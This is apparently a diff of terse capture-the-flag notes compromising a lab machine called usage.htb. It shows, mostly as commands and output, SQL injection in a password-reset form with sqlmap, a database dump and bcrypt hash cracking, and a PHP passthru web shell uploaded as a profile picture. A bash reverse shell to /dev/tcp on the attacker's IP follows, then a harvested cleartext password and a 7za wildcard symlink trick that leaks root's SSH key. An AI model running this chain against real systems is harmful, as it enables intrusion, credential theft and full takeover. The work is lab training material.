@@ -1,27 +1,233 @@
+
+
+
+
+
+reset password allow error message enumeration
+
+and SQLi
+We have e-mailed your password reset link to ' or 1=1#
+
+
 ┌──(root㉿kali)-[/home/kali]
-└─# wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://10.10.11.177/ -H "Host: FUZZ.siteisup.htb" -t 50 --hc 404,302 --hh 1131
- /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
-********************************************************
-* Wfuzz 3.1.0 - The Web Fuzzer                         *
-********************************************************
+└─# sqlmap -r reset.req -p email --batch --level 3 --dbs
+...
+available databases [3]:
+[*] information_schema
+[*] performance_schema
+[*] usage_blog
 
-Target: http://10.10.11.177/
-Total requests: 19966
 
-=====================================================================
-ID           Response   Lines    Word       Chars       Payload                                             
-=====================================================================
+┌──(root㉿kali)-[/home/kali]
+└─# sqlmap -r reset.req -p email --batch --level 3 --threads=10 -D usage_blog --tables
+...
+Database: usage_blog
+[15 tables]
++------------------------+
+| mefsaialYacc?ss_tokens |
+| admin_menu             |
+| admin_operation_log    |
+| admin_permissions      |
+| admin_role_menu        |
+| admin_role_permissions |
+| admin_role_users       |
+| admin_roles            |
+| admin_user_permissions |
+| admin_users            |
+| blog                   |
+| failed_jobs            |
+| migrations             |
+| password_reset_tokens  |
+| users                  |
++------------------------+
+...
 
-000000019:   403        9 L      28 W       281 Ch      "dev"                                               
-000009532:   400        10 L     35 W       301 Ch      "#www"                                              
-000010581:   400        10 L     35 W       301 Ch      "#mail"                                             
+too many threads caused the personal_access_tokens table to be broken
 
-Total time: 21.80406
-Processed Requests: 19966
-Filtered Requests: 19963
-Requests/sec.: 915.7007
 
+┌──(root㉿kali)-[/home/kali]
+└─# sqlmap -r reset.req -p email --batch --level 3 -D usage_blog -T admin_users --dump
+...
+Table: admin_users
+[1 entry]
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+...
+
+┌──(root㉿kali)-[/home/kali]
+└─# echo '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2' >hash
                                                                                                                      
 ┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+whatever1        (?)     
+1g 0:00:00:06 DONE (2025-12-10 09:01) 0.1490g/s 241.4p/s 241.4c/s 241.4C/s alexis1..serena
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+we are able to login to admin.usage.htb with
+admin:whatever1
+
+we see
+
+Dependencies
+php 	^8.1
+encore/laravel-admin 	1.8.18
+guzzlehttp/guzzle 	^7.2
+laravel/framework 	^10.10
+laravel/sanctum 	^3.2
+laravel/tinker 	^2.8
+symfony/filesystem 	^6.3
+
+https://nvd.nist.gov/vuln/detail/CVE-2023-24249
+An arbitrary file upload vulnerability in laravel-admin v1.8.19 allows attackers to execute arbitrary code via a crafted PHP file.
+
+
+we upload through the profile picture functionality.
+there is no magic bytes check
+exec does not work, we use passthru
+
+┌──(root㉿kali)-[/home/kali]
+└─# echo '<?php passthru($_GET["cmd"]); ?>' > shell.jpg
+
+upload, intercept, throw .php on at the end
+                                                                                                                     
+http://admin.usage.htb/uploads/images/shell.jpg.php?cmd=id
+
+uid=1000(dash) gid=1000(dash) groups=1000(dash) 
+
+http://admin.usage.htb/uploads/images/shell.jpg.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.38%2F53%200%3E%261%22%0A
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lnvp 53   
+listening on [any] 53 ...
+connect to [10.10.14.38] from (UNKNOWN) [10.10.11.18] 57780
+bash: cannot set terminal process group (1226): Inappropriate ioctl for device
+bash: no job control in this shell
+dash@usage:/var/www/html/project_admin/public/uploads/images$ 
+
+
+dash@usage:~$ ls -lsa
+total 48
+4 drwxr-x--- 6 dash dash 4096 Dec 10 14:38 .
+4 drwxr-xr-x 4 root root 4096 Aug 16  2023 ..
+0 lrwxrwxrwx 1 root root    9 Apr  2  2024 .bash_history -> /dev/null
+4 -rw-r--r-- 1 dash dash 3771 Jan  6  2022 .bashrc
+4 drwx------ 3 dash dash 4096 Aug  7  2023 .cache
+4 drwxrwxr-x 4 dash dash 4096 Aug 20  2023 .config
+4 drwxrwxr-x 3 dash dash 4096 Aug  7  2023 .local
+4 -rw-r--r-- 1 dash dash   32 Oct 26  2023 .monit.id
+4 -rw------- 1 dash dash 1192 Dec 10 14:38 .monit.state
+4 -rwx------ 1 dash dash  707 Oct 26  2023 .monitrc
+4 -rw-r--r-- 1 dash dash  807 Jan  6  2022 .profile
+4 drwx------ 2 dash dash 4096 Aug 24  2023 .ssh
+4 -rw-r----- 1 root dash   33 Dec 10 12:25 user.txt
+dash@usage:~$ cat .monitrc
+#Monitoring Interval in Seconds
+set daemon  60
+
+#Enable Web Access
+set httpd port 2812
+     use address 127.0.0.1
+     allow admin:3nc0d3d_pa$$w0rd
+
+
+dash@usage:~$ su xander
+Password: 
+xander@usage:/home/dash$ 
+
+xander@usage:/home/dash$ sudo -l
+Matching Defaults entries for xander on usage:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User xander may run the following commands on usage:
+    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
+
+
+
+xander@usage:/home/dash$ strings /usr/bin/usage_management
+/lib64/ld-linux-x86-64.so.2
+chdir
+__cxa_finalize
+__libc_start_main
+puts
+system
+__isoc99_scanf
+perror
+printf
+libc.so.6
+GLIBC_2.7
+GLIBC_2.2.5
+GLIBC_2.34
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+PTE1
+u+UH
+/var/www/html
+/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
+Error changing working directory to /var/www/html
+/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql
+Password has been reset.
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 
+
+
+
+xander@usage:/home/dash$ ls -lsad /var/www/html
+4 drwxrwxrwx 4 root xander 4096 Apr  3  2024 /var/www/html
+
+xander@usage:/home/dash$ cd /var/www/html
+xander@usage:/var/www/html$ touch @id_rsa
+xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa
+xander@usage:/var/www/html$ sudo /usr/bin/usage_management
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 1
+
+7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=C.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7763 64-Core Processor                 (A00F11),ASM,AES-NI)
+
+Scanning the drive:
+          
+WARNING: No more files
+-----BEGIN OPENSSH PRIVATE KEY-----
+
+
+WARNING: No more files
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+
+
+WARNING: No more files
+QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
+...
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# chmod 600 rootkey
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# ssh -i rootkey root@usage.htb   
+...
+root@usage:~# id
+uid=0(root) gid=0(root) groups=0(root)
 
 
